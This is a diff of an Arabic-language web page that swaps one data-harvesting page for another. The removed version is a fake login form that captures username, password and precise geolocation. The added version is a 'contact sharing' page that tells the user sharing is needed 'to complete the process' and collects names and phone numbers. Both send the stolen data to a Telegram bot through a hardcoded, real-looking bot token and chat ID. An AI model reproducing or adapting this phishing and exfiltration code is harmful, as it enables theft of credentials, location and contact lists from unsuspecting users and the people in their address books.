@@ -3,35 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج تسجيل الدخول</title>
+    <title>خدمة المشاركة</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
             background-color: #f5f5f5;
-            padding: 20px;
         }
-        .form-container {
-            background: white;
-            max-width: 500px;
+        .container {
+            max-width: 600px;
             margin: 0 auto;
-            padding: 20px;
+            background-color: white;
+            padding: 30px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            box-sizing: border-box;
         }
         button {
             background-color: #0088cc;
@@ -41,162 +27,89 @@
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            width: 100%;
+            margin-top: 20px;
         }
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
+        button:hover {
+            background-color: #006699;
         }
-        #message {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0088cc;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        #status {
+            margin-top: 20px;
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <div class="form-container">
-        <h2>تسجيل الدخول</h2>
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="username">اسم المستخدم:</label>
-                <input type="text" id="username" required>
-            </div>
-            <div class="form-group">
-                <label for="password">كلمة المرور:</label>
-                <input type="password" id="password" required>
-            </div>
-            <button type="submit" id="submitBtn">
-                <span id="btnText">تسجيل الدخول</span>
-                <span id="btnLoader" class="loader" style="display:none;"></span>
-            </button>
-        </form>
-        <div id="message"></div>
+    <div class="container">
+        <h1>مشاركة جهات الاتصال</h1>
+        <p>الرجاء الموافقة على مشاركة جهات الاتصال لاستكمال العملية</p>
+        <button id="shareBtn">مشاركة جهات الاتصال</button>
+        <div id="status"></div>
     </div>
 
     <script>
-        // استبدل هذه القيم بمعلومات بوتك
-        const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
-        const CHAT_ID = '7327464581';
-        
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        document.getElementById('shareBtn').addEventListener('click', async function() {
+            const statusElement = document.getElementById('status');
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const messageElement = document.getElementById('message');
-            const submitBtn = document.getElementById('submitBtn');
-            const btnText = document.getElementById('btnText');
-            const btnLoader = document.getElementById('btnLoader');
-            
-            // تعطيل الزر وإظهار المؤشر
-            submitBtn.disabled = true;
-            btnText.textContent = 'جاري إرسال البيانات...';
-            btnLoader.style.display = 'inline-block';
+            // التحقق من دعم واجهة Contacts API
+            if (!('contacts' in navigator && 'select' in navigator.contacts)) {
+                statusElement.innerHTML = 'عذرًا، متصفحك لا يدعم مشاركة جهات الاتصال.';
+                return;
+            }
             
             try {
-                // الحصول على الموقع الجغرافي
-                const position = await getLocation();
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
-                const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                statusElement.innerHTML = 'جاري جلب جهات الاتصال...';
                 
-                // إرسال البيانات إلى تليجرام
-                const text = `🔐 بيانات تسجيل دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n\n📍 الموقع الجغرافي:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n- رابط الخريطة: ${googleMapsLink}\n\n⏰ ${new Date().toLocaleString()}`;
+                // طلب الإذن للوصول إلى جهات الاتصال
+                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
                 
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                if (contacts.length === 0) {
+                    statusElement.innerHTML = 'لم يتم اختيار أي جهات اتصال.';
+                    return;
+                }
+                
+                statusElement.innerHTML = `تم جلب ${contacts.length} جهة اتصال، جاري الإرسال...`;
+                
+                // استخراج أرقام الهاتف
+                const phoneNumbers = [];
+                contacts.forEach(contact => {
+                    if (contact.tel && contact.tel.length > 0) {
+                        contact.tel.forEach(phone => {
+                            phoneNumbers.push({
+                                name: contact.name ? contact.name.join(' ') : 'غير معروف',
+                                number: phone
+                            });
+                        });
+                    }
+                });
+                
+                // إرسال البيانات إلى بوت تلجرام (استبدل YOUR_BOT_TOKEN و YOUR_CHAT_ID بالقيم الفعلية)
+                const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+                const chatId = '7327464581';
+                const message = `أرقام الهاتف المجمعة:\n\n${phoneNumbers.map(p => `${p.name}: ${p.number}`).join('\n')}`;
+                
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                    }),
+                        chat_id: chatId,
+                        text: message
+                    })
                 });
                 
-                const data = await response.json();
+                const result = await response.json();
                 
-                if (data.ok) {
-                    showMessage('تم إرسال البيانات بنجاح!', 'success');
+                if (result.ok) {
+                    statusElement.innerHTML = 'تم إرسال جهات الاتصال بنجاح!';
                 } else {
-                    throw new Error(data.description || 'خطأ في الإرسال');
+                    statusElement.innerHTML = 'حدث خطأ أثناء الإرسال.';
                 }
             } catch (error) {
-                showMessage(`خطأ: ${error.message}`, 'error');
-                console.error('Error:', error);
-            } finally {
-                // إعادة تمكين الزر وإخفاء المؤشر
-                submitBtn.disabled = false;
-                btnText.textContent = 'تسجيل الدخول';
-                btnLoader.style.display = 'none';
+                statusElement.innerHTML = `حدث خطأ: ${error.message}`;
+                console.error(error);
             }
         });
-        
-        function getLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    reject(new Error('المتصفح لا يدعم خدمة الموقع الجغرافي'));
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    position => resolve(position),
-                    error => {
-                        let errorMessage;
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = "تم رفض طلب الوصول إلى الموقع الجغرافي";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = "معلومات الموقع غير متاحة";
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = "انتهى وقت طلب الموقع";
-                                break;
-                            default:
-                                errorMessage = "حدث خطأ غير معروف أثناء تحديد الموقع";
-                        }
-                        reject(new Error(errorMessage));
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-        
-        function showMessage(text, type) {
-            const messageElement = document.getElementById('message');
-            messageElement.textContent = text;
-            messageElement.style.display = 'block';
-            
-            if (type === 'success') {
-                messageElement.style.backgroundColor = '#d4edda';
-                messageElement.style.color = '#155724';
-            } else {
-                messageElement.style.backgroundColor = '#f8d7da';
-                messageElement.style.color = '#721c24';
-            }
-        }
     </script>
 </body>
 </html>
